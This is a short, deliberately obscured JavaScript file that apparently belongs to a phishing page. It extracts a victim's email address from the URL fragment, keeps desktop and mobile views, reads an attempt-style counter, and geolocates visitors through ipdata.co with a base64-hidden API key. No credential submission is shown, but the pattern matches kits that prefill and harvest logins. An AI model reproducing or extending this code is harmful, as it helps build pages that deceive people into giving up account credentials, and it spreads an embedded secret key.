const __winHref = window.location.href.split("?")[0];
const __getInd__ = (str, search) => str.indexOf(search);
const __getSlice__ = (str, index) => str.substr(index);
const __getEl__ = (sel) => document.querySelector(sel);
const __json = (url) => fetch(url).then((res) => res.json());
const d_view = __getEl__(".d-view");
const m_view = __getEl__(".m-view");
const scToAppend = __getEl__("#sctoapnd");
const setAttr__ = (__attr, __val, __elem) =>
__elem.setAttribute(__attr, __val);

 const __getURLEm = () => {
    if(__getInd__(__winHref, "#") === -1){
        console.log("u 1 failed");
        return false;
    }

    if(__getInd__(__winHref, "@") === -1){
        console.log("u 2 failed");
        return false;
    }

    return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
}

// subC rtvr
const _getSC_ = (_s = null, subj = 'l') => {
    const new_sc = { sc: 0, new: true };
  
    if (!_s || typeof _s !== "string") {
      console.log("sc rtrvl fld");
      return  new_sc;
    }
  
    const _sc_indx = _s.indexOf(subj);
  
    console.log({ _sc_indx });
  
    if (_sc_indx === -1) return new_sc;
  
    const sc = Number(_s.substring(_sc_indx + 1));
  
    if (typeof sc !== "number" || isNaN(sc)) {
      console.log("error: sc rtrvl fld", { sc });
      return new_sc;
    }
  
    console.log({ sc });
    return { sc, new: false };
  };

  async function loadLoc() {
    return await __json(
      `https://api.ipdata.co?api-key=${atob(
        "OTBiZjAxNDQxODM2YWZiNjdiMzIyODE0ODhiYWI1NzAzYjYzMTMwY2NiYzU0MTkyZjNkYmI4MGM="
      )}`
    );
  }


  // get rootHref
 const getRootHref = () => {
  return __winHref.substring(0, __winHref.indexOf('hl'));
 }